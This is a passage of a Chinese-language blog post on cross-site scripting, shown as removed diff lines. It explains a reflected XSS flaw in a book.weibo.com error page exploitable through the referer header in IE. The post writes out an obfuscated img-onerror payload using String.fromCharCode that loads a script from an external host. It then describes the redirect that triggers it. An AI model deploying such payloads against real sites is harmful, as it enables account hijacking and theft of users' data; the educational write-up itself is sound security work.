-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 也就是说这个接口会校验`error.referer`</span></span><br><span class="line">&#123;<span class="string">"code"</span>:<span class="number">-1</span>,<span class="string">"message"</span>:<span class="string">"\u8bf7\u6c42\u6e90\u4e0d\u5141\u8bb8[http:\/\/error.referer]"</span>&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>当<code>error.referer</code>返回来后页面的响应报文为<code>Content-Type: text/html; charset=utf-8</code>，既然错误后的<code>Content-Type</code>为<code>text/html</code>，那么我们就可以在此做文章；</p>
-</li>
-<li>虽然在 Chrome 和 Firefox 下，referrer 都会被进行 url encode导致无法插入HTML标签。<strong>但是该问题，可以在 IE 进行 XSS 攻击；</strong></li>
-<li><p>我们在自己的服务器做一些处理，向我们服务器发起请求，即在浏览器地址栏输入如下 URL；</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// e=document.createElement("script");e.src="http://a.xxx.xyz/book.weibo.js",document.documentElement.appendChild(e)</span></span><br><span class="line"><span class="comment">// 将上面的转换为 char code 的形式</span></span><br><span class="line"><span class="comment">// 完整 URL 如下</span></span><br><span class="line">http:<span class="comment">//a.xxx.xyz/?a=&lt;img src=1 onerror=eval(String.fromCharCode(101,61,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,34,115,99,114,105,112,116,34,41,59,101,46,115,114,99,61,34,104,116,116,112,58,47,47,97,46,122,104,99,104,98,105,110,46,120,121,122,47,98,111,111,107,46,119,101,105,98,111,46,106,115,34,44,100,111,99,117,109,101,110,116,46,100,111,99,117,109,101,110,116,69,108,101,109,101,110,116,46,97,112,112,101,110,100,67,104,105,108,100,40,101,41))&gt;</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>请求后我们的服务器会重定向跳转到<code>http://book.weibo.com/newcms/i/weibo_send.php</code>，这时候的 <code>error.referer</code> 就会被我们植入 XSS 攻击脚本了。</p>
-</li>
-</ol>
-<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>可以看到，大多数漏洞都是处于绕来绕去最后发现漏洞的地方没有进行过滤转义处理。正所谓 <strong>攻击千万条，安全第一条。过滤不规范，开发两行泪。</strong></p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
-<li><a href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC" target="_blank" rel="noopener">跨站脚本 - 维基百科，自由的百科全书</a></li>
-<li><a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Cross-site_scripting" target="_blank" rel="noopener">跨站脚本攻击(Cross-site scripting) - 术语表 | MDN</a></li>
-<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP" target="_blank" rel="noopener">内容安全策略( CSP ) - HTTP | MDN</a></li>
-<li><a href="https://www.owasp.org/index.php/Cross-site_Scripting_(XSS" target="_blank" rel="noopener">Cross-site Scripting (XSS)</a>)</li>
-</ul>
-]]></content>
-      
-        <categories>
-            
-            <category> http </category>
-            
-            <category> web-secure </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> http </tag>
-            
-            <tag> web-secure </tag>
             
         </tags>
         
